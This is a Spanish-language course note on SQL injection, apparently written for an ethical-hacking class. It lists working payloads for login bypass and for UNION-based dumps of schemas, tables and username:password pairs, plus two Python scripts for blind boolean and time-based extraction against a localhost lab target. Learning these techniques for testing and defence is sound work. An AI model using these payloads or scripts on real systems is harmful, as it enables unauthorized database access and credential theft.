# OWASP TOP 10 ❮❯

## SQLI

Tags: #SQLI #OWASP #Explotacion 

**SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.

Las inyecciones SQL se producen cuando los atacantes insertan código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.

Hay varios tipos de inyecciones SQL, incluyendo:

-   **Inyección SQL basada en errores**: Este tipo de inyección SQL aprovecha **errores en el código SQL** para obtener información. Por ejemplo, si una consulta devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema.
-   **Inyección SQL basada en tiempo**: Este tipo de inyección SQL utiliza una consulta que **tarda mucho tiempo en ejecutarse** para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional
-   **Inyección SQL basada en booleanos**: Este tipo de inyección SQL utiliza consultas con **expresiones booleanas** para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.
-   **Inyección SQL basada en uniones**: Este tipo de inyección SQL utiliza la cláusula “**UNION**” para combinar dos o más consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula “**UNION**” con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios.
-   **Inyección SQL basada en stacked queries**: Este tipo de inyección SQL aprovecha la posibilidad de **ejecutar múltiples consultas** en una sola sentencia para obtener información adicional. Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla.

Cabe destacar que, además de las técnicas citadas anteriormente, existen muchos otros tipos de inyecciones SQL. Sin embargo, estas son algunas de las más populares y comúnmente utilizadas por los atacantes en páginas web vulnerables.

Asimismo, es necesario hacer una breve distinción de los diferentes tipos de bases de datos existentes:

-   **Bases de datos relacionales**: Las inyecciones SQL son más comunes en bases de datos relacionales como MySQL, SQL Server, Oracle, PostgreSQL, entre otros. En estas bases de datos, se utilizan consultas SQL para acceder a los datos y realizar operaciones en la base de datos.
-   **Bases de datos NoSQL**: Aunque las inyecciones SQL son menos comunes en bases de datos NoSQL, todavía es posible realizar este tipo de ataque. Las bases de datos NoSQL, como MongoDB o Cassandra, no utilizan el lenguaje SQL, sino un modelo de datos diferente. Sin embargo, es posible realizar inyecciones de comandos en las consultas que se realizan en estas bases de datos. Esto lo veremos unas clases más adelante.
-   **Bases de datos de grafos**: Las bases de datos de grafos, como Neo4j, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los nodos y relaciones que se han almacenado en la base de datos.
-   **Bases de datos de objetos**: Las bases de datos de objetos, como db4o, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los objetos que se han almacenado en la base de datos.

Es importante entender los diferentes tipos de inyecciones SQL y cómo pueden utilizarse para obtener información confidencial y controlar una base de datos. Los desarrolladores deben asegurarse de validar adecuadamente la entrada del usuario y de utilizar técnicas de defensa, como la sanitización de entrada y la preparación de consultas SQL, para prevenir las inyecciones SQL en sus aplicaciones web.

A continuación, se proporciona el enlace a la utilidad online de ‘**ExtendsClass**‘ que utilizamos en esta clase:

-   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)


## Comandos 

Tenemos: **DB > TABLAS > COLUMNAS > DATOS**
**Antes de la primer coma debemos de colocar un valor que no exista en la DB. Asi lo que inyectemos se podra visualizar.**


### Inyecciones mirando el error en el Output

Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre el **error**.
* La mayoria de las inyecciones las puedes hacer empezando por  '
* Dependiendo de la web podemos iniciar con comilla y a veces no, cuando es el caso tambien no es necesario colocar el comentario -- - al final de la query.
* Un indicio de inyeccion SQL es encontrar en la url **.php?id=** No es necesario que diga **id** tambien puede tener otro parametro. 

```bash
❯ ' or 1=1-- -                                        # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion 
❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
❯ ' order by 100-- -                                  # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error
```

Despues de saber cuantas columnas existen podemos usar Union Select para meter un data en ese columna, esperando a que tambien esa columna acepte datos. Aqui tendriamos un ejemplo de que existen 3 columnas. Pero pueden ser mas o menos, dependiendo la DB.
```bash
❯ ' union select 1,2,3 -- -                           # Primero colocamos eso y buscamos cual es el numero que nos pone en el output de la web, ya que es en esa columna en donde podremos inyectar algo
❯ ' union select NULL,NULL,NULL -- -                  # Aveces solo acepta NULL en lugar de numeros
❯ ' union select "test",NULL,NULL -- -                # Podemos colocar texto 
❯ ' union select database(),NULL,NULL -- -            # Queremos que muestre el nombre de la base de datos actual en uso
```

Para saber las bases de datos (DB) existentes.
```bash 
❯ ' union select schema_name from information_schema.schemata-- -                    # Nos muestra todas las bases de datos existentes  
❯ ' union select schema_name from information_schema.schemata limit 0,1-- -          # Nos muestra todas las bases de datos existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
❯ ' union select group_concat(schema_name) from information_schema.schemata-- -      # Nos muestra todas las bases de datos existentes, pero separadas por comas
```

Para saber las tablas de la base de datos (DB) especifica.
```bash
❯ ' union select table_name from information_schema.tables where table_schema='❮DB_Name❯'-- -                    # Nos muestra las tablas existentes
❯ ' union select group_concat(table_name) from information_schema.tables where table_schema='❮DB_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
❯ ' union select table_name from information_schema.tables limit 0,1-- -                                         # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
```

Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica.
```bash 
❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las tablas existentes
❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯' limit 0,1-- -          # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
❯ ' union select group_concat(column_name) from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
```

Para que nos muestre los datos de las columnas.
```bash
❯ ' union select group_concat(username) from ❮DB_Name❯.❮Table_Name❯-- -          # Especificamos la DB y la tabla, si la DB no es la que esta en uso y nos muestra los datos
❯ ' union select group_concat(username) from ❮Table_Name❯-- -                    # Para que nos muestre los datos, aqui asumimos que la base de datos es la que esta en uso 
❯ ' union select group_concat(username,':',password) from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
❯ ' union select group_concat(username,0x3a,password) from ❮Table_Name❯-- -      # Para que nos muestre los datos de los usuarios y su passwd separados por :

	 # Debemos de colocar los caracteres en Hexadecimal para evitar fallos
	 # : = 0x3a (Hex) 
```


### Inyecciones sin ver el error en el Output 'Blind'

-   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Condiciones**

* **SQL Conditional**: Parra este caso debemos de hacer el Script en Python3
```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
    
# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def MakeSQLI():
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Datos extraidos")
    extrated_info = ""

    for position in range(1, 150):
        for character in range(33, 126): # El 9 de abajo es un valor que no existe
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
#           sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
            p1.status(sqli_url)
            r = requests.get(sqli_url)
            if r.status_code == 200:
                extrated_info += chr(character)
                p2.status(extrated_info)
                break

if __name__ == '__main__':
    MakeSQLI()

```


* **SQL Time**: Parra este caso debemos de hacer el Script en Python3
```python 
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
    
# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def MakeSQLI():
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Datos extraidos")
    extrated_info = ""

    for position in range(1, 150):
        for character in range(33, 126): # El 1 de abajo es un valor que si existe
            sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=%d,sleep(0.35),1)" % (position, character)
           #sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, character)
            p1.status(sqli_url)
            time_start = time.time()
            r = requests.get(sqli_url)
            time_end = time.time()
            if time_end - time_start > 0.35:
                extrated_info += chr(character)
                p2.status(extrated_info)
                break

if __name__ == '__main__':
    MakeSQLI()
```



